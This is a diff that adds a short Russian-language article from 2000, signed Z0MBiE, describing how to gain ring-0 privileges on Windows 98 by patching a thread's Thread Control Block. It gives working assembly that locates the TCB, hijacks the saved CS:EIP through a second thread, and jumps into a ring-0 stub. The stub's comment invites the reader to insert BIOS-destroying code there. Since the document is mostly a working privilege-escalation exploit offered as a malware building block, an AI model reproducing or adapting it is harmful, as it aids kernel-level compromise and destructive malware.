@@ -1,0 +1,78 @@
+
+                         win98: в ring-0 через TCB
+                         -------------------------
+
+                              (x) 2000 Z0MBiE
+                           http://z0mbie.host.sk
+
+     Вашему  вниманию  представляется  очередной  способ  перехода в ring0,
+ правда только под win98. Но он может быть легко переделан в win9X.
+
+     Идея  заключается  в  следующем.  На  каждую нить (thread) есть хитрая
+ структура,  называемая  TCB (Thread Control Block). Эта структура содержит
+ много   всякой   интересной  информации,  например  набор  регистров,  и в
+ частности, CS:EIP. А под win9X, TCB, само собой, можно пропатчить.
+
+     Как  найти TCB? Четвердым двордом TCB имеет удобную сигнатуру: 'THCB'.
+ Но  искать всякий отстой в памяти уже, честно говоря, надоело, поэтому под
+ win98 можно сделать так:
+
+                        mov     eax, 4Fh    ; 4Fh/93h: i2E_xxGetCurrentThread
+                        int     2Eh
+                        mov     eax, [eax]  ; EAX <-- current TCB
+                        mov     save_tcbptr, eax
+
+     Далее  скажем,  что пропатчить CS:EIP у текущей нити из нее же -- дело
+ непростое, так что создадим для этого новую нить.
+
+                        push    offset tid      ; *ThreadId
+                        push    0               ; flags
+                        push    12345678h       ; parameter
+                        push    offset newthread; address
+                        push    0               ; stack size. 0==same
+                        push    0
+                        callW   CreateThread
+
+     Далее, приостановим текущую нить, чтобы выполнилась нить созданная:
+
+                        push    1               ; while threads switching
+                        callW   Sleep
+
+     И вот, мы уже побывали в нуле. Что же происходило в новой нити?
+
+newthread:              pusha
+
+                        mov     eax, save_tcbptr                ; main TCB
+                        mov     eax, [eax].TCB_ClientPtr        ; registers
+
+                        lea     ecx, ring0
+                        xchg    ecx, [eax].Client_EIP           ; EIP
+                        mov     save_eip, ecx
+
+                        mov     ecx, 28h ; std. win9x ring0 selector
+                        xchg    cx, [eax].Client_CS             ; CS
+                        mov     save_cs, ecx
+
+                        popa
+                        retn
+
+     Как  видим,  простая  замена  CS:EIP  на  свои  собственные. А вот так
+ выглядит процедура, на которую попадает управление в нуле:
+
+ring0:                  pusha
+                        push    ds es
+
+                        mov     eax, ss
+                        mov     ds, eax
+                        mov     es, eax
+
+                        ; сюда вставьте факап биоса
+
+                        pop     es ds
+                        popa
+
+                        push    cs:save_cs
+                        push    cs:save_eip
+                        retf
+
+     Ну, собственно, это все. А вы чего ждали?
